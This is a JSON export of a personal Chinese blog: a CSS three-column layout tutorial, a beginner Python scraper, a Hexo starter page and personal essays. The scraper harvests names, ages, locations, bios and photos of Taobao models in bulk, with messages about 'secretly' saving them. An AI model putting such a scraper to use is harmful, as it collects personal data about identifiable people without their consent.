CSS清单: 123456789101112131415161718192021.main &#123; float: left; width: 100%; &#125; .sub &#123; float: left; width: 190px; margin-left: -100%; position: relative; left: -190px; &#125; .extra &#123; float: left; width: 230px; margin-left: -230px; position: relative; right: -230px; &#125;#bd &#123; padding: 0 230px 0 190px; &#125; 一些说明 DOM元素的书写顺序不得更改。 当面板的main内容部分比两边的子面板宽度小的时候，布局就会乱掉。可以通过设置main的min-width属性或使用双飞翼布局避免问题。 二列的实现方法 如果是左边带有侧栏的二栏布局，则去掉右侧栏，不要设置主面板的padding-right值，其他操作相同。反之亦然。 d. 双飞翼布局(float + 负margin + margin)原理说明： 双飞翼布局和圣杯布局的思想有些相似，都利用了浮动和负边距，但双飞翼布局在圣杯布局上做了改进，在main元素上加了一层div, 并设置margin,由于两侧栏的负边距都是相对于main-wrap而言，main的margin值变化便不会影响两个侧栏，因此省掉了对两侧栏设置相对布局的步骤。 DOM文档: 12345&lt;div id=\"main-wrap\" class=\"column\"&gt; &lt;div id=\"main\"&gt;#main&lt;/div&gt;&lt;/div&gt;&lt;div class=\"sub\"&gt;&lt;/div&gt; &lt;div class=\"extra\"&gt;&lt;/div&gt; 布局步骤: 三者都设置向左浮动。 设置main-wrap宽度为100%，设置两个侧栏的宽度。 设置 负边距，sub设置负左边距为100%，extra设置负左边距为负的自身宽度。 设置main的margin值给左右两个子面板留出空间。 CSS清单:1234567891011121314151617.main &#123; float: left; width: 100%; &#125; .sub &#123; float: left; width: 190px; margin-left: -100%; &#125; .extra &#123; float: left; width: 230px; margin-left: -230px; &#125;.main-wrap &#123; margin: 0 230px 0 190px;&#125; 一些说明 圣杯采用的是padding，而双飞翼采用的margin，解决了圣杯布局main的最小宽度不能小于左侧栏的缺点。 双飞翼布局不用设置相对布局，以及对应的left和right值。 通过引入相对布局，可以实现三栏布局的各种组合，例如对右侧栏设置position: relative; left: 190px;,可以实现sub+extra+main的布局。 二列的实现方法 如果是左边带有侧栏的二栏布局，则去掉右侧栏，不要设置main-wrap的margin-right值，其他操作相同。反之亦然。 e. flex布局如果你还没有学习flex布局，阮一峰老师的两篇博文将会很适合你。 阮一峰的博客——flex语法阮一峰的博客——flex布局案例 以下是五种布局的flex布局代码： DOM文档：1234567891011121314151617181920212223&lt;div class=\"layout\"&gt; &lt;aside class=\"layout__aside\"&gt;侧边栏宽度固定&lt;/aside&gt; &lt;div class=\"layout__main\"&gt;主内容栏宽度自适应&lt;/div&gt;&lt;/div&gt;&lt;div class=\"layout\"&gt; &lt;div class=\"layout__main\"&gt;主内容栏宽度自适应&lt;/div&gt; &lt;aside class=\"layout__aside\"&gt;侧边栏宽度固定&lt;/aside&gt;&lt;/div&gt;&lt;div class=\"layout\"&gt; &lt;aside class=\"layout__aside\"&gt;左侧边栏宽度固定&lt;/aside&gt; &lt;div class=\"layout__main\"&gt;主内容栏宽度自适应&lt;/div&gt; &lt;aside class=\"layout__aside\"&gt;右侧边栏宽度固定&lt;/aside&gt;&lt;/div&gt;&lt;div class=\"layout\"&gt; &lt;aside class=\"layout__aside\"&gt;第1个侧边栏宽度固定&lt;/aside&gt; &lt;aside class=\"layout__aside\"&gt;第2个侧边栏宽度固定&lt;/aside&gt; &lt;div class=\"layout__main\"&gt;主内容栏宽度自适应&lt;/div&gt;&lt;/div&gt;&lt;div class=\"layout\"&gt; &lt;div class=\"layout__main\"&gt;主内容栏宽度自适应&lt;/div&gt; &lt;aside class=\"layout__aside\"&gt;第1个侧边栏宽度固定&lt;/aside&gt; &lt;aside class=\"layout__aside\"&gt;第2个侧边栏宽度固定&lt;/aside&gt;&lt;/div&gt; CSS清单123456789.layout &#123; display: flex;&#125;.layout__main &#123; flex: 1;&#125;.layout__aside &#123; width: 200px;&#125; 与之前所讲的几种传统布局方案相比，flex布局的代码可谓异常简洁，而且非常通用，利用简单的三行CSS即实现了常见的五种布局。 总结传统的布局方法基于盒状模型，依赖 display属性 + position属性 + float属性，逻辑相对复杂，对于实现一些特殊效果，例如垂直居中，尤其复杂繁琐。而flex布局中的flex容器可以根据实际可用空间动态调整子元素的宽高比和顺序，使元素能够尽可能地利用可用空间，同时也能通过缩小来避免超出。flex布局提供了一套简便、完整、响应式的布局方案。 flex布局将是CSS布局的趋势，还未正式成为标准的gird布局也异常吸睛，于是知乎上很多刚入门的小伙伴有了疑惑 2017年，圣杯和双飞翼布局已经淘汰了，真的？，对于此我个人仍然坚持我的观点2017年，圣杯和双飞翼布局已经淘汰了，真的？ - Shelley Lee 的回答 - 知乎,至少在目前过渡阶段，仍然坚持夯实基础，稳步向前。 本文完。 PS：以后会继续写Flex布局和Grid布局相关文章，欢迎持续关注，也欢迎大家对文章提出建议或意见。 参考链接CSS垂直居中和水平居中圣杯布局小结","categories":[],"tags":[{"name":"CSS","slug":"CSS","permalink":"http://yoursite.com/tags/CSS/"},{"name":"前端","slug":"前端","permalink":"http://yoursite.com/tags/前端/"}]},{"title":"Python小爬虫的那些事","slug":"Python小爬虫的那些事","date":"2013-09-10T07:41:44.000Z","updated":"2018-02-20T10:39:59.807Z","comments":true,"path":"2013/09/10/Python小爬虫的那些事/","link":"","permalink":"http://yoursite.com/2013/09/10/Python小爬虫的那些事/","excerpt":"","text":"Python从接触计算机以来，一直都有着想深入了解一门语言。也是因为有做着网络电商的原因吧，店家每天都一直维护干着同样或者是类似流水线式的工作,每天得上传自己的产品修改着宝贝详细里的描述，有时也得观察着同行的一举一动。让我拥有了想做一个真正脚本的想法念头，解放自己的劳动力！俗话说的好解放劳动力才能增大自己的生产里，从琐碎事里摆脱，做着认为对自己有用的事情才能增长。 Python抓取网页方法，任务是批量下载网站上的文件。对于一个刚刚入门python的人来说，在很多细节上都有需要注意的地方，以下就分享一下在初学python过程中遇到的问题及解决方法。学习Python，当然少不了环境的配置，最初我用的是Notepad++，不过发现它的提示功能实在是太弱了，于是，在Windows下我用了PyCharm，在Linux下我用了Eclipse for Python，另外还有几款比较优秀的IDE urllib库 Python万能的胶水语言使得让它有更大的活力，以至于在爬虫这个领域中也诞生的很多库。 response = urllib2.urlopen(&quot;http://www.baidu.com&quot;) urlopen(url, data, timeout) print response.read() import urllib2 request = urllib2.Request(&quot;http://www.baidu.com&quot;) response = urllib2.urlopen(request) print response.read() 那么就开始吧 import urllib import urllib2 import re import tool import os #抓取买家主页个人介绍123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132class Spider: #页面初始化 def __init__(self): self.siteURL = 'http://mm.taobao.com/json/request_top_list.htm' self.tool = tool.Tool() #获取索引页面的内容 def getPage(self,pageIndex): url = self.siteURL + \"?page=\" + str(pageIndex) request = urllib2.Request(url) response = urllib2.urlopen(request) return response.read().decode('gbk') #获取索引界面所有的信息，list格式 def getContents(self,pageIndex): page = self.getPage(pageIndex) pattern = re.compile('&lt;div class=\"list-item\".*?pic-word.*?&lt;a href=\"(.*?)\".*?&lt;img src=\"(.*?)\".*?&lt;a class=\"lady-name.*?&gt;(.*?)&lt;/a&gt;.*?&lt;strong&gt;(.*?)&lt;/strong&gt;.*?&lt;span&gt;(.*?)&lt;/span&gt;',re.S) items = re.findall(pattern,page) contents = [] for item in items: contents.append([item[0],item[1],item[2],item[3],item[4]]) return contents #获取MM个人详情页面 def getDetailPage(self,infoURL): response = urllib2.urlopen(infoURL) return response.read().decode('gbk') #获取个人文字简介 def getBrief(self,page): pattern = re.compile('&lt;div class=\"mm-aixiu-content\".*?&gt;(.*?)&lt;!--',re.S) result = re.search(pattern,page) return self.tool.replace(result.group(1)) #获取页面所有图片 def getAllImg(self,page): pattern = re.compile('&lt;div class=\"mm-aixiu-content\".*?&gt;(.*?)&lt;!--',re.S) #个人信息页面所有代码 content = re.search(pattern,page) #从代码中提取图片 patternImg = re.compile('&lt;img.*?src=\"(.*?)\"',re.S) images = re.findall(patternImg,content.group(1)) return images #保存多张图片 def saveImgs(self,images,name): number = 1 print u\"发现\",name,u\"共有\",len(images),u\"张照片\" for imageURL in images: splitPath = imageURL.split('.') fTail = splitPath.pop() if len(fTail) &gt; 3: fTail = \"jpg\" fileName = name + \"/\" + str(number) + \".\" + fTail self.saveImg(imageURL,fileName) number += 1 # 保存头像 def saveIcon(self,iconURL,name): splitPath = iconURL.split('.') fTail = splitPath.pop() fileName = name + \"/icon.\" + fTail self.saveImg(iconURL,fileName) #保存个人简介 def saveBrief(self,content,name): fileName = name + \"/\" + name + \".txt\" f = open(fileName,\"w+\") print u\"正在偷偷保存她的个人信息为\",fileName f.write(content.encode('utf-8')) #传入图片地址，文件名，保存单张图片 def saveImg(self,imageURL,fileName): u = urllib.urlopen(imageURL) data = u.read() f = open(fileName, 'wb') f.write(data) print u\"正在悄悄保存她的一张图片为\",fileName f.close() #创建新目录 def mkdir(self,path): path = path.strip() # 判断路径是否存在 # 存在 True # 不存在 False isExists=os.path.exists(path) # 判断结果 if not isExists: # 如果不存在则创建目录 print u\"偷偷新建了名字叫做\",path,u'的文件夹' # 创建目录操作函数 os.makedirs(path) return True else: # 如果目录存在则不创建，并提示目录已存在 print u\"名为\",path,'的文件夹已经创建成功' return False #将一页淘宝MM的信息保存起来 def savePageInfo(self,pageIndex): #获取第一页淘宝列表 contents = self.getContents(pageIndex) for item in contents: #item[0]个人详情URL,item[1]头像URL,item[2]姓名,item[3]年龄,item[4]居住地 print u\"发现一位,名字叫\",item[2],u\"age\",item[3],u\",在\",item[4] print u\"正在保存\",item[2],\"的信息\" print u\"个人地址是\",item[0] #个人详情页面的URL detailURL = item[0] #得到个人详情页面代码 detailPage = self.getDetailPage(detailURL) #获取个人简介 brief = self.getBrief(detailPage) #获取所有图片列表 images = self.getAllImg(detailPage) self.mkdir(item[2]) #保存个人简介 self.saveBrief(brief,item[2]) #保存头像 self.saveIcon(item[1],item[2]) #保存图片 self.saveImgs(images,item[2]) #传入起止页码，获取图片 def savePagesInfo(self,start,end): for i in range(start,end+1): print u\"正在找第\",i,u\"个地方，看看在不在\" self.savePageInfo(i) #传入起止页码即可，在此传入了2,10,表示抓取第2到10页1```spider.savePagesInfo(2,10) Request库1234567891011121314151617181920212223使用 Requests 发送网络请求非常简单。 import requestsrequests库提供了http所有的基本请求方式 r = requests.post(\"http://httpbin.org/post\") r = requests.put(\"http://httpbin.org/put\") r = requests.delete(\"http://httpbin.org/delete\") r = requests.head(\"http://httpbin.org/get\") r = requests.options(\"http://httpbin.org/get\")一次完整的请求 import requests r = requests.get('https://taobao.com') r.text## Scripts","categories":[],"tags":[{"name":"Life","slug":"Life","permalink":"http://yoursite.com/tags/Life/"},{"name":"work","slug":"work","permalink":"http://yoursite.com/tags/work/"},{"name":"python","slug":"python","permalink":"http://yoursite.com/tags/python/"},{"name":"爬虫","slug":"爬虫","permalink":"http://yoursite.com/tags/爬虫/"}]},{"title":"Hello World","slug":"hexo","date":"2013-07-13T12:46:25.000Z","updated":"2018-02-12T11:41:03.923Z","comments":true,"path":"2013/07/13/hexo/","link":"","permalink":"http://yoursite.com/2013/07/13/hexo/","excerpt":"","text":"Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick StartCreate a new post1$ hexo new \"My New Post\" More info: Writing Run server1$ hexo server More info: Server Generate static files1$ hexo generate More info: Generating Deploy to remote sites1$ hexo deploy More info: Deployment","categories":[],"tags":[]},{"title":"电子商务","slug":"电子商务","date":"2013-07-13T10:41:51.000Z","updated":"2018-02-12T15:11:39.553Z","comments":true,"path":"2013/07/13/电子商务/","link":"","permalink":"http://yoursite.com/2013/07/13/电子商务/","excerpt":"","text":"电子商务？过去的时间里发生了很多事，其中最大的变化应该是家庭缘故吧，作为在广州出生长大的潮汕人，从小家里就做着各种生意。父亲也时常教育着我们要学习好英语才能和外国人做外贸，在未来帮我们铺垫了道路—-商务英语国际外贸专业。也是珠三角地带的特点，让每个家庭都运营着前店后厂的形式。每个做生意的人都存在的各种大大小小形式的库存。恰好马云这几年来的宣传，使得电子商贸流行起来了 电子商务的本质是什么?许多人的认知都会不一样，我认为电子商务是技术驱动的交易便利化。电商的本质依然是零售，只是将线下的交易搬到了线上。虽然本质没变，但它带来的便利性、高效是革命性的 开网店在家人的凑合下，便开启了做网店的道路,自己的小店还是门可罗雀,自己在淘宝购物也有几百了，但是没想到成为卖家，出售商品是困难。自己是很认真的在经营自己的小店，才刚刚开始，家里人也鼓励我，刚开始都是这样的。我也在不断坚定自己的信心，好怕哪天信心都磨光了。慢慢的由于自己也是相当与厂家直销，价格也比其他人低廉，销量也稳步慢慢上涨着，看在每天都忙得不可开交，一个人又要打包也得当小二客服和顾客沟通，处理日常，运营着店铺大大小小的事情，有时还得不得不赔偿退款。虽然也没什么利润，但过的也充实着","categories":[],"tags":[{"name":"Life","slug":"Life","permalink":"http://yoursite.com/tags/Life/"},{"name":"work","slug":"work","permalink":"http://yoursite.com/tags/work/"}]},{"title":"计算机普及要从娃娃抓起","slug":"计算机要从娃娃抓起","date":"2011-11-23T10:44:21.000Z","updated":"2018-02-12T14:34:20.683Z","comments":true,"path":"2011/11/23/计算机要从娃娃抓起/","link":"","permalink":"http://yoursite.com/2011/11/23/计算机要从娃娃抓起/","excerpt":"","text":"计算机普及要从娃娃抓起 我陷入了深深的沉思从小学开始就一直宣传主导的这句广为人知的话， 计算机普及要从娃娃抓起，老师说：我们现在步入了21世纪，这是一个信息时代。我们是新世纪的接班人，是跨实际的新一代。这都是00后必备的，大家应该会的。如果问很多同学你会玩电脑吗？你会用电脑吗？可能很多同学都说会，但好象是只会玩游戏，会聊天——但你会用photoshop吗？你知道电脑是什么原理吗，Cpu为什么可以运行程序？二进制？同学们有的说不会，有的则连这些名词听也没听说过。 其他很多人认为计算机技术都是一件轻松容易的事情，只要动手点点，就是计算机。但其实很多部分我们都不知道到底是什么，为什么会这样 邓爷爷说过，“计算机要从娃娃抓起！”，这句话很对,但是看来只会上上网，不懂计算机。 小学甚至于中学，学生应该是学习的是基础知识，计算机作为一个工具，很多都认为没有太大必要或没有太大必要投入过多精力让学生去学习，因为计算机作为工具随着技术进步在不断变化，可能在这些学生真正要利用他的时候，已经变得完全不同，基本上就认为其实没有必要，掌握计算机这个工具会越来越简单，因为计算机的使用也是朝越来越简单方便的方向发展。","categories":[],"tags":[{"name":"Life","slug":"Life","permalink":"http://yoursite.com/tags/Life/"},{"name":"初中","slug":"初中","permalink":"http://yoursite.com/tags/初中/"}]},{"title":"Hello World","slug":"初中的开始","date":"2011-09-13T12:46:25.000Z","updated":"2018-02-12T15:13:16.019Z","comments":true,"path":"2011/09/13/初中的开始/","link":"","permalink":"http://yoursite.com/2011/09/13/初中的开始/","excerpt":"","text":"初中的开始（此文来自于qq空间，部分文章过于年久包含大量个人信息，将不移植到此博客中-） 一个结束又是另一个开端？这个学期已接近尾声了，而这是我最后一次的小学记录，也是最后感叹了。一学期一次总结的记录，不知什么时候养成的习惯。期间也有发现其实有些事不应该写出来要删掉，但总感觉如果删除了不知道什么时候再会突然后悔。还是希望我将永远保存下去吧 人是要倾诉，要快乐，要伤心的。有些人爱向父母说自已的快乐，自已的遭遇;有些人爱向老师、同学倾诉;我爱在自己的一片天地里诉说。那一一段一句，都是自已曾经写下来的。 当我长大或老了的时候，再翻开寻找到这里，也许会说：“噢，原来我是这样长大的","categories":[],"tags":[{"name":"Life","slug":"Life","permalink":"http://yoursite.com/tags/Life/"},{"name":"初中","slug":"初中","permalink":"http://yoursite.com/tags/初中/"}]}]}